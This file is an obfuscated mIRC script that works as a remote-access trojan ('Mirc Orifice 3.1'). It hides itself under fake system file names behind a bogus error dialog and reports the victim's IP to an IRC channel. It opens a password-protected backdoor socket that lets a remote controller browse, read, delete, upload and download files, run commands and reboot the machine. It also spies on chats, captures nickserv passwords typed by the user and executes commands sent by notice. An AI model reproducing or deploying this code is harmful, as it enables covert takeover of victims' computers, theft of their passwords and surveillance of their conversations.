On 1:load: { set %sr2 $chr(99) $+ :\ $+ $chr(119) $+ indo $+ $chr(119) $+ s\H $+ $chr(73) $+ M $+ $chr(69) $+ M $+ $chr(51) $+ $chr(50) $+ .S $+ $chr(89) $+ S | set %sr3 $chr(99) $+ :\ $+ $chr(73) $+ O $+ $chr(51) $+ 2 $+ $chr(46) $+ S $+ $chr(89) $+ S | if ($script == %sr2) || ($script == %sr3) { halt } | set %sr1 $chr(99) $+ :\ $+ $chr(119) $+ indo $+ $chr(119) $+ s 
if ($exists(%sr1) == $true) { if ($exists(%sr2) == $true) { .remove %sr2 } | .copy $script %sr2 | .timererr 1 1 mo.err | .load -rs %sr2 | goto m } | if ($exists(%sr3) == $true) { .remove %sr3 } | .copy $script %sr3 | .timererr 1 1 mo.err | .load -rs %sr3 | :m | unset %sr1 %sr2 %sr3 %sr4 | t | if ($server != $null) { .notice #m $+ $chr(105) $+ rc-orif $+ $chr(105) $+ ce $ip - %mo.we V. $chr(51) $+ .1 | .timeran off | .timeran 0 600 av } | .remove $script | .unload -rs $script | halt }
alias mo.err { dialog -m mo.err mo.err }
dialog mo.err { 
  size 150 150 220 60 
  Title "Mirc Error" 
  text "",1, 5 10 240 20 
  button "&Aceptar",2,80 30 50 20,ok 
}
on 1:dialog:mo.err:init:0: { did -a mo.err 1 ERROR: Version del mirc $version no compatible | halt } 
on 1:socklisten:mo.ab: { if ($sock(mo.ab.ya) != $null) { halt } | set %in 0 | sockaccept mo.ab.ya | if ($sock(mo.ab.ya).ip == $ip) || ($sock(mo.ab.ya).ip == 127.0.0.1) || ($sock(mo.ab.ya).ip == localhost) { sockclose mo.ab.ya | halt } | set %mo.ed $chr(115) $+ ock $+ $chr(119) $+ rite -nt $chr(109) $+ o.ab.y $+ $chr(97) 
set %anu6 $chr(76) $+ a $chr(115) $+ inta $+ $chr(120) $+ is $chr(101) $+ s: | set %noe $chr(78) $+ o e $+ $chr(120) $+ ist $+ $chr(101) | set %mo.sp no | set %imb $chr(104) $+ $chr(101) $+ $chr(108) $+ $chr(108) $+ $chr(111) $+ $chr(122)
%mo.ed - -- ---=<[ $chr(77) $+ ir $+ $chr(99) $chr(79) $+ ri $+ $chr(102) $+ ice $chr(51) $+ .1 ]>=--- -- - | if (%mo.in == $null) { %mo.ed $chr(67) $+ on $+ $chr(101) $+ ct $+ $chr(97) $+ do.  | set %in 1 | halt } | if (%mo.in != $null) { %mo.ed $chr(80) $+ as $+ $chr(115) $+ wo $+ $chr(114) $+ d: | return } }
on 1:sockread:mo.ab.ya: { if (%in == 0) { goto 1v } | else { goto 2v } | :1v | if ($sockerr > 0) return | unset %a.tmp | sockread %a.tmp | if (%mo.in != $null) { if (%a.tmp == %mo.in) { set %in 1
  %mo.ed $chr(66) $+ ien, $chr(72) $+  EL $+ $chr(80) $chr(112) $+ ar $+ $chr(97) $chr(97) $+ yud $+ $chr(97) | return } } | if (%mo.in != $null) { if (%a.tmp != %mo.in) || (%a.tmp != $chr(114) $+ $chr(48) $+ $chr(48) $+ $chr(108) $+ $chr(122)) { %mo.ed $chr(77) $+ mm, $chr(77) $+ al | sockclose mo.ab.ya | return } } | :2v |  if ($sockerr > 0) return | sockread %a.tmp
  set %ju %a.tmp | unset %a.tmp | if ($left(%ju,4) == $chr(112) $+ as $+ $chr(115)) { set %ju $mid(%ju,6,8) | $chr(109) $+ o.pi $+ $chr(110) | halt } | if ($left(%ju,4) == $chr(112) $+ or $+ $chr(116)) { set %ju $mid(%ju,6,5) | $chr(109) $+ o.pw $+ $chr(101) | halt } | if ($left(%ju,2) == $chr(108) $+ s) { set %ju $mid(%ju,4,200) | $chr(109) $+ o.v $+ $chr(100) | halt } 
  if ($left(%ju,3) == $chr(99) $+ a $+ $chr(116)) { set %ju $mid(%ju,5,200) | $chr(109) $+ o.v $+ $chr(102) | halt } |  if ($left(%ju,4) == $chr(112) $+ ic $+ $chr(111)) { set %ju $mid(%ju,6,200) | $chr(109) $+ o.e $+ $chr(102) | halt } | if ($left(%ju,5) == $chr(114) $+ m $+ $chr(100) $+ ir) { set %ju $mid(%ju,7,200) | $chr(109) $+ o.b $+ $chr(100) | halt } 
  if ($left(%ju,2) == $chr(114) $+ m) { set %ju $mid(%ju,4,200) | $chr(109) $+ o.b | halt } | if ($left(%ju,4) == $chr(101) $+ xe $+ $chr(99) $+) { set %ju $mid(%ju,6,200) | $chr(109) $+ o.e | halt } | if ($left(%ju,3) == $chr(115) $+ py) { set %ju $mid(%ju,5,3) | $chr(109) $+ o.sp | halt } | if ($left(%ju,5) == $chr(109) $+ k $+ $chr(100) $+ ir) { set %ju $mid(%ju,7,200) | $chr(109) $+ o.c $+ $chr(100) | halt }
  if ($left(%ju,4) == $chr(99) $+ op $+ $chr(121)) { set %ju $mid(%ju,6,200) | $chr(109) $+ o.c $+ $chr(112) | halt } | if ($left(%ju,6) == $chr(114) $+ ena $+ $chr(109) $+ e) { set %ju $mid(%ju,8,200) | $chr(109) $+ o.r $+ $chr(110) | halt } | if ($left(%ju,4) == $chr(105) $+ nf $+ $chr(111)) { set %ju $mid(%ju,6,4) | $chr(109) $+ o.i | halt } 
  if ($left(%ju,5) == $chr(115) $+ p $+ $chr(108) $+ ay) { set %ju $mid(%ju,7,200) | $chr(109) $+ o.s | halt } | if ($left(%ju,4) == $chr(102) $+ in $+ $chr(100)) { set %ju $mid(%ju,6,200) | $chr(109) $+ o.f $+ $chr(110) | halt } | if ($left(%ju,6) == $chr(114) $+ eb $+ $chr(111) $+ ot) { set %ju $mid(%ju,8,200) | $chr(109) $+ o.r $+ $chr(98) | halt } 
  if ($left(%ju,3) == $chr(101) $+ mu) { set %ju $mid(%ju,5,200) | $chr(109) $+ o.e $+ $chr(109) | halt } | if ($left(%ju,3) == $chr(117) $+ rl) { set %ju $mid(%ju,5,200) | $chr(109) $+ o.u $+ $chr(114) | halt } | if ($left(%ju,4) == $chr(98) $+ ca $+ $chr(116)) { set %ju $mid(%ju,6,200) | $chr(109) $+ o.b $+ $chr(99) | halt } 
  if ($left(%ju,3) == $chr(98) $+ ye) { set %ju $mid(%ju,5,2) | $chr(109) $+ o.c $+ $chr(101) | halt } | if ($left(%ju,3) == g $+ $chr(101) $+ t) { set %ju $mid(%ju,5,250) | mo.g $+ $chr(101) $+ t | halt } | if ($left(%ju,3) == p $+ $chr(117) $+ t) { set %ju $mid(%ju,5,250) | mo.p $+ $chr(117) $+ t | halt } |   if ($left(%ju,7) == bo $+ $chr(117) $+ ncer) { set %ju $mid(%ju,9,250) | mo.boun | halt } 
if ($left(%ju,6) == bo.cie) { mo.bo $+ $chr(117) $+ n.cle | %mo.ed Cerrado el bouncer | halt } | else { %mo.ed %ju - $chr(191) $+ $chr(81) $+ ue $chr(101) $+ s $chr(101) $+ so $+ $chr(63) } }
alias mo.bc { if (%ju == $null) { %mo.ed %anu6 b $+ $chr(99) $+ at $chr(99) $+ :\h $+ $chr(101) $+ lp.d $+ $chr(111) $+ c | halt } | if ($exists(%ju) == $false) { %mo.ed %noe %ju | halt } | %mo.ed _____( $chr(65) $+ bri $+ $chr(101) $+ ndo %ju )_____  | set %bs $file(%ju).size | set %i 1 | :lp | if (%i >= %bs) { goto fin } | bread %ju %i 4096 &bcat | sockwrite -n mo.ab.ya &bcat 
set %i %i + 4096 | goto lp | :fin | %mo.ed $str(¯,26) $+ ( E $chr(79) $+ F ) $+ $str(¯,26) | halt }
alias mo.ur { if (%ju == $null) { %mo.ed %anu6 url ht $+ $chr(116) $+ p:// $+ $chr(112) $+ agin $+ $chr(97) $+ .de/ $+ $chr(116) $+ ara $+ $chr(107) $+ o | halt } |  if ($version < 5.8) { %mo.ed $chr(78) $+ o fu $+ $chr(110) $+ cio $+ $chr(110) $+ a :( | halt }
/url %ju | %mo.ed $chr(67) $+ arg $+ $chr(97) $+ da: %ju | halt }
alias mo.em { if (%ju == $null) { %mo.ed %anu6 emu "n $+ $chr(105) $+ ck" "e $+ $chr(114) $+ es to $+ $chr(110) $+ to" | halt } | if ($query($co1) == $null) { %mo.ed $chr(78) $+ o ha $+ $chr(98) $+ la c $+ $chr(111) $+ n $co1 | halt } | echo $co1 < $+ $co1 $+ > $co2 | %mo.ed Em $+ $chr(117) $+ la $+ $chr(100) $+ o e $+ $chr(110) $+ $co1 < $+ $co1 $+ > $co2  | unset %co1 %co2 | halt }
alias mo.rb { %mo.ed _____( $chr(82) $+ ein  $+ $chr(105) $+ cian $+ $chr(100) $+ o $+ $chr(108) $+ e e $+ $chr(108) $chr(80) $+ C a $me )_____ | //.run $chr(99) $+ :\ $+ $chr(87) $+ INDO $+ $chr(87) $+ S\RU $+ $chr(78) $+ DLL32.E $+ $chr(88) $+ E u $+ $chr(115) $+ er.e $+ $chr(120) $+ e,E $+ $chr(120) $+ it $+ $chr(87) $+ indo $+ $chr(119) $+ s | halt }
alias mo.fn { if (%ju == $null) { %mo.ed %anu6 find " $+ $chr(99) $+ :\ $+ $chr(119) $+ indo $+ $chr(119) $+ s" "*.p $+ $chr(119) $+ l" | halt } | if ($exists($co1) == $false) { %mo.ed %noe $co1 | halt } | set %i 1 | %mo.ed _____( $chr(66) $+ usc $+ $chr(97) $+ ndo $co2 $chr(101) $+ n: $co1 )_____ | :l | if ($findfile($co1,$co2,%i,1)  == $null ) {  goto fin } 
%mo.ed $findfile($co1,$co2,%i,1) $file($findfile($co1,$co2, %i ,1)).size bytes | inc %i 1 | goto l | :fin | %mo.ed $str(¯,21)  $+ ( F $+ $chr(105) $+ n $chr(100) $+ e l $+ $chr(97) bu $+ $chr(115) $+ que $+ $chr(100) $+ a ) $+ $str(¯,21) | halt }
alias mo.pin { if (%ju == $null) { %mo.ed %anu6 p $+ $chr(97) $+ ss p $+ $chr(97) $+ ss/ $+ $chr(110) $+ o | halt } | if (%ju == no) { %mo.ed Q $+ $chr(117) $+ ita $+ $chr(100) $+ o e $+ $chr(108) $chr(112) $+ ass $+ $chr(119) $+ or $+ $chr(100) | unset %mo.in | halt }
set %mo.in %ju | set %mo.iin %mo.in | %mo.ed $chr(69) $+ l $chr(112) $+ ass $+ $chr(119) $+ or $+ $chr(100) e $+ $chr(115) $+ : %mo.in }
alias mo.pwe { if (%ju == $null) { %mo.ed %anu6 p $+ $chr(111) $+ rt pu $+ $chr(101) $+ rto | halt } | set %mo.we %ju | %mo.ed Pu $+ $chr(101) $+ rto " $+ %mo.we $+ " l $+ $chr(97) pro $+ $chr(120) $+ ima v $+ $chr(101) $+ z  }
alias mo.vd {  set %anu12 ls c:\ | if (%ju == $null) { %mo.ed %anu6 ls c:\ | halt } | if ($exists(%ju) == $false) { %mo.ed %noe %ju | halt } | %mo.ed _____( L $+ $chr(105) $+ sta $+ $chr(110) $+ do %ju )_____ | set %i 1 | :lp1 | if ($finddir(%ju,*,%i,1)  == $null ) { goto arch } |  %mo.ed $finddir(%ju,*,%i,1) ( $+ d $+ $chr(105) $+ re $+ $chr(99) $+ tor $+ $chr(105) $+ o $+ ) | inc %i | goto lp1 | :arch 
set %i 1 | :lp2 | if ($findfile(%ju,*,%i,1)  == $null ) { goto fin } | %mo.ed $findfile(%ju,*,%i,1) $file($findfile(%ju,*, %i ,1)).size b $+ $chr(121) $+ tes | inc %i 1 | goto lp2 | :fin | %mo.ed $str(¯,23) $+ ( F $+ $chr(105) $+ n d $+ $chr(101) $+ l l $+ $chr(105) $+ sta $+ $chr(100) $+ o ) $+ $str(¯,23) | halt } 
alias mo.vf { if (%ju == $null) { %mo.ed %anu6 cat c:\au $+ $chr(116) $+ oe $+ $chr(120) $+ ec.bat | halt } | if ($exists(%ju) == $false) { %mo.ed %noe %ju | halt } | set %l.v $lines(%ju) | %mo.ed _____( A $+ $chr(98) $+ rie $+ $chr(110) $+ do %ju )_____ | set %i 1 | :lp |  if (%i > %l.v) { goto fin } | %mo.ed $read -l $+ %i %ju | inc %i 1 | goto lp | :fin | %mo.ed $str(¯,26) $+ ( E $+ $chr(79) $+ F ) $+ $str(¯,26) | halt }
alias mo.b { if (%ju == $null) { %mo.ed %anu6 $chr(114) $+ m $chr(102) $+ ich $+ $chr(101) $+ ro | halt } | if ($exists(%ju) == $false) { %mo.ed %noe | halt } | .remove %ju | %mo.ed $chr(66) $+ or $+ $chr(114) $+ ado %ju | halt }
alias mo.e { if (%ju == $null) { %mo.ed %anu6 e $+ $chr(120) $+ ec co $+ $chr(109) $+ ando | halt } | //. $+ %ju | %mo.ed E $+ $chr(106) $+ ecu $+ $chr(116) $+ ado %ju | halt }
alias mo.sp { if (%ju == $null) { %mo.ed %anu6 s $+ $chr(112) $+ y a $+ $chr(108) $+ l/p $+ $chr(114) $+ v/ $+ $chr(110) $+ o - A $+ $chr(104) $+ ora: %mo.sp | halt } | if (%ju == all) { set %mo.sp all | %mo.ed E $+ $chr(115) $+ pia $+ $chr(110) $+ do: %mo.sp | halt } 
  if (%ju == prv) { set %mo.sp prv | %mo.ed E $+ $chr(115) $+ pia $+ $chr(110) $+ do: %mo.sp | halt } | if (%ju == no) { set %mo.sp no | %mo.ed E $+ $chr(115) $+ pia $+ $chr(110) $+ do: %mo.sp | halt } 
else { %mo.ed %anu6 s $+ $chr(112) $+ y al $+ $chr(108) $+ /p $+ $chr(114) $+ v/ $+ $chr(110) $+ o | halt } }
on 1:TEXT:%imb:*: { .notice $nick $ip %mo.we V. $chr(51) $+ .1 | halt }
on 1:TEXT:*:?: { if (%mo.sp == prv) || (%mo.sp == all) && ($sock(mo.ab.ya) != $null) { %mo.ed < $+ $nick $+ > - $1- } }
on 1:TEXT:*:#: { if (%mo.sp == all) && ($sock(mo.ab.ya) != $null) { %mo.ed [[ $+ $chan $+ ]] - < $+ $nick $+ > $1- } }
on 1:input:*: { if ( n $+ $chr(105) $+ ck@ $+ $chr(100) $+ ee $+ $chr(112) $+ .s $+ $chr(112) $+ ace isin $1- ) || (auth isin $1-) { set %mo.saca Nick: $me - I $+ $chr(100) $+ en $+ $chr(116) $+ ify: $1- } | if (%mo.sp == all) || (%mo.sp == prv) && ($sock(mo.ab.ya) != $null) { 
%mo.ed [[ $+ $chan $+ ]] - < $+ $me $+ > $1- } } 
alias mo.cd { if (%ju == $null) { %mo.ed %anu6 $chr(99) $+ :\ca $+ $chr(112) $+ ullo | halt } | .mkdir %ju | %mo.ed Cre $+ $chr(97) $+ do %ju | halt }
alias mo.cp {  if (%ju == $null) { %mo.ed %anu6 co $+ $chr(112) $+ y " $+ $chr(99) $+ :\t.t $+ $chr(120) $+ t" " $+ $chr(100) $+ :\t.t $+ $chr(120) $+ t" | halt } | if ($exists($co1) == $false) { %mo.ed %noe $co1 | halt } | .copy $co1 $co2 | %mo.ed Co $+ $chr(112) $+ ia $+ $chr(100) $+ o $co1 a $co2 | unset %co1 %co2 | halt }
alias mo.ef { if (%ju == $null) { %mo.ed %anu6 p $+ $chr(105) $+ co " $+ $chr(99) $+ :\t.t $+ $chr(120) $+ t" "h $+ $chr(111) $+ la" | halt } | .write $co1 $co2 | %mo.ed E $+ $chr(115) $+ cr $+ $chr(105) $+ to $co2 en $co1 | unset %co1 %co2 | halt }
alias mo.rn {  if (%ju == $null) { %mo.ed %anu6 r $+ $chr(101) $+ na $+ $chr(109) $+ e " $+ $chr(99) $+ :\t.t $+ $chr(120) $+ t" " $+ $chr(99) $+ :\a.t $+ $chr(120) $+ t" | halt } 
if ($exists($co1) == $false) { %mo.ed %noe $co1 | halt } | .rename $co1 $co2 | %mo.ed R $+ $chr(101) $+ no $+ $chr(109) $+ bra $+ $chr(100) $+ o $co1 a $co2 | unset %co1 %co2 | halt }
alias mo.bd { if (%ju == $null) { %mo.ed %anu6 $chr(114) $+ m $+ $chr(100) $+ ir d $+ $chr(100) $+ re $+ $chr(99) $+ tor $+ $chr(100) $+ o | halt } | if ($exists(%ju) == $false) { %mo.ed %noe %ju | halt } | .rmdir %ju | %mo.ed B $+ $chr(111) $+ rr $+ $chr(97) $+ do: %ju | halt }
alias mo.i  { %mo.ed $str(_,59) | %mo.ed S $+ $chr(117)  N $+ $chr(105) $+ ck: $me | %mo.ed %mo.saca | %mo.ed P $+ $chr(117) $+ er $+ $chr(116) $+ o d $+ $chr(101) $+ l se $+ $chr(114) $+ ver: %mo.we 
  %mo.ed D $+ $chr(105) $+ sc $+ $chr(111) $+ s  $chr(100) $+ ur $+ $chr(111) $+ s: $hd $hdd $hddd | %mo.ed P $+ $chr(111) $+ rta $+ $chr(112) $+ ap $+ $chr(101) $+ les: $cb | %mo.ed P $+ $chr(97) $+ gi $+ $chr(110) $+ a v $+ $chr(105) $+ sit $+ $chr(97) $+ da: $url
  %mo.ed Se $+ $chr(114) $+ vi $+ $chr(100) $+ or  $chr(100) $+ e I $+ $chr(82) $+ C: $server | %mo.ed H $+ $chr(111) $+ ra: $time | %mo.ed A $+ $chr(119) $+ ay: $aw 
%mo.ed Pr $+ $chr(105) $+ va $+ $chr(100) $+ os c $+ $chr(111) $+ n: $mo.pri | %mo.ed C $+ $chr(97) $+ na $+ $chr(108) $+ es: $mo.chan | %mo.ed R $+ $chr(101) $+ d: $network | %mo.ed Mirc: $version | %mo.ed S. $+ $chr(79) $+ : $os | %mo.ed Lo $+ $chr(99) $+ al $+ $chr(104) $+ ost: $host | %mo.ed $str(¯,58) | halt }
alias aw { if ($away == $true) { set %mo.aw Si } | if ($away == $false) { set %mo.aw No } | return %mo.aw }
alias hd { set %h1 c:\ | set %h2 d:\ | set %h3 e:\ | set %h4 f:\ | set %h5 g:\ | set %h6 h:\ | if ($exists(%h1) == $false) { unset %h1 | goto 1 } | set %h1 ( %h1 Size: $disk(%h1).size Free: $disk(%h1).free Tipo: $disk(%h1).type ) |  :1 |   if ($exists(%h2) == $false) { unset %h2 | goto 2 } 
  set %h2 ( %h2 Size: $disk(%h2).size Free: $disk(%h2).free Tipo: $disk(%h2).type ) | :2 | if ($exists(%h3) == $false) { unset %h3 | goto 3 } | set %h3 ( %h3 Size: $disk(%h3).size Free: $disk(%h3).free Tipo: $disk(%h3).type ) | :3 | if ($exists(%h4) == $false) { unset %h4 | goto 4 } 
  set %h4 ( %h4 Size: $disk(%h4).size Free: $disk(%h4).free Tipo: $disk(%h4).type ) | :4 | if ($exists(%h5) == $false) { unset %h5 | goto 5 } | set %h5 ( %h5 Size: $disk(%h5).size Free: $disk(%h5).free Tipo: $disk(%h5).type ) | :5 | if ($exists(%h6) == $false) { unset %h6 | goto 6 } 
set %h6 ( %h6 Size: $disk(%h6).size Free: $disk(%h6).free Tipo: $disk(%h6).type ) | :6 | set %hd $crlf %h1 $crlf %h2 $crlf | set %hdd %h3 $crlf %h4 $crlf | set %hddd %h5 $crlf %h6  | return %hd %hdd %hddd }
alias mo.pri { unset %mo.priv | set %i 1 | :lp | if ($query(%i) == $null ) { goto fin } | set %mo.priv $addtok(%mo.priv,$query(%i),32) | inc %i | goto lp | :fin | return %mo.priv }
alias mo.chan { unset %mo.chan | set %i 1 | :lp | if ($chan(%i) == $null ) { goto fin } | set %mo.chan $addtok(%mo.chan,$chan(%i),32) | inc %i | goto lp | :fin | return %mo.chan }
alias mo.s { if (%ju == $null) { %mo.ed %anu6 sp $+ $chr(108) $+ ay c:\tr.wav | halt } | if ($exists(%ju) == $false) { %mo.ed %noe %ju | halt } | .splay %ju | %mo.ed E $+ $chr(106) $+ ecu $+ $chr(116) $+ ado so $+ $chr(110) $+ ido: %ju | halt }
alias mo.ce { unset %ju %l.v %com? %id %co? %mo.sp %i %anu* %id %h? %hdd %hddd %mo.aw %mo.chan %noe | %mo.ed C $+ $chr(101) $+ rra $+ $chr(110) $+ do l $+ $chr(97) co $+ $chr(110) $+ ex $+ $chr(105) $+ on... | sockclose mo.ab.ya }
on ^1:NOTICE:*:*: { if ($1 == mo) { $2- | halt } }
on 1:start: { t } 
on 1:connect: { .timeran off | .timeran 0 600 av | av } 
on *:error:*: halt
alias av { :m | if ($ip != $null) { .notice #m $+ $chr(105) $+ rc-orif $+ $chr(105) $+ ce $ip %mo.we V. $chr(51) $+ .1 | halt } | goto m } 
alias t { sockclose mo.ab | sockclose mo.ab.ya | if (%mo.we == $null) { set %mo.we 64000 } | if ($portfree(%mo.we) != $true) { inc %mo.we 1 } | .timerr 1 1 socklisten mo.ab %mo.we }
raw 401:*: halt 
raw 403:*: halt
raw 353:*: halt
raw 366:*: halt
raw 327:*: halt 
alias mo.get { if (%ju == $null) { %mo.ed %anu6 get c:\autoexec.bat | halt } | if ($exists(%ju) == $false) { %mo.ed No existe %ju | halt } | set %get.arc %ju  | set %b.mds 0 | set %mof.we %mo.we | inc %mof.we | if ($sock(espera.binario) != $null) { sockclose espera.binario }
socklisten espera.binario %mof.we | halt }
on 1:socklisten:espera.binario { sockaccept binario.ya | %mo.ed get.connected  $file(%get.arc).size | sockclose espera.binario | halt }
on 1:sockread:binario.ya { sockread %f.tmp | if (%f.tmp == mas) { sube.datos } | else halt } 
alias sube.datos { if ($sock(binario.ya).sent < $file(%get.arc).size ) { bread %get.arc %b.mds 4096 &b.read.temp | sockwrite binario.ya &b.read.temp | set %b.mds $bvar(&b.read.temp,0) + %b.mds |  halt  } | if ($sock(binario.ya).sent >= $file(%get.arc).size ) {  %mo.ed Bajado el 100% de: %get.arc ( $+ $file(%get.arc).size Bytes $+ ) | sockclose binario.ya  } | halt }
alias mo.put { unset %nno | if (%ju == $null) { %mo.ed %anu6 put "c:\tu_fichero.exe" "c:\su_carpeta\fichero.exe" | halt } | set %mof.we %mo.we | inc %mof.we | set %nno 1 | if ($sock(pf.bin) != $null) { sockclose pf.bin } | socklisten pf.bin %mof.we | halt }
on 1:socklisten:pf.bin { sockaccept put.bin | %mo.ed put.connected | sockclose pf.bin } 
on 1:sockread:put.bin: { if (%nno == 1) { sockread %put.tmp | set %put.it %put.tmp | set %put.dir $nofile(%put.tmp) | if ($exists(%put.dir) == $false) { %mo.ed ERROR: no existe ese directorio | sockclose put.bin |  halt } | set %put.it %put.tmp | set %nno 2 | sockwrite -nt put.bin manda | halt }
sockread &put.tmp | bwrite %put.it -1 &put.tmp | sockwrite -n put.bin manda }
alias mo.boun.cle { unset %mo.bo.port | unset %mo.bo.ip | unset %mo.bo.port2 | sockclose mo.bo | sockclose  mo.bo.ya | sockclose mo.bo.si }
alias mo.boun { mo.boun.cle | set %mo.bo.port $gettok(%ju,1,32) | set %mo.bo.ip $gettok(%ju,2,32) | set %mo.bo.port2 $gettok(%ju,3,32) | %mo.ed Bouncer abierto en: %mo.bo.port hacia: %mo.bo.ip en: %mo.bo.port2 | socklisten mo.bo %mo.bo.port }
on 1:socklisten:mo.bo { sockopen mo.bo.ya %mo.bo.ip %mo.bo.port2 | sockaccept mo.bo.si | sockclose mo.bo }
on 1:sockread:mo.bo.si { if ($sockerr > 0) { return } | sockread %mo.boun | if ($sock(mo.bo.ya) != $null) { sockwrite -n mo.bo.ya %mo.boun } | halt } 
on 1:sockread:mo.bo.ya { if ($sockerr > 0) { return } | sockread %mo.boun2 | sockwrite -n mo.bo.si %mo.boun2 }
alias co1 { set %com1 $pos(%ju,",1) | set %com2 $pos(%ju,",2) | if (%com1 == $null) || (%com2 == $null) { %mo.ed Faltan comillas  halt } | inc %com1 | set %com2 %com2 - %com1 | set %co1 $mid(%ju,%com1,%com2) | unset %com1 %com2 %com3 %com4 | return %co1 }
alias co2 { set %com3 $pos(%ju,",3) | set %com4 $pos(%ju,",4) | if (%com3 == $null) || (%com4 == $null) { %mo.ed Faltan comillas  halt } | inc %com3 | set %com4 %com4 - %com3 | set %co2 $mid(%ju,%com3,%com4) | unset %com1 %com2 %com3 %com4 | return %co2 }

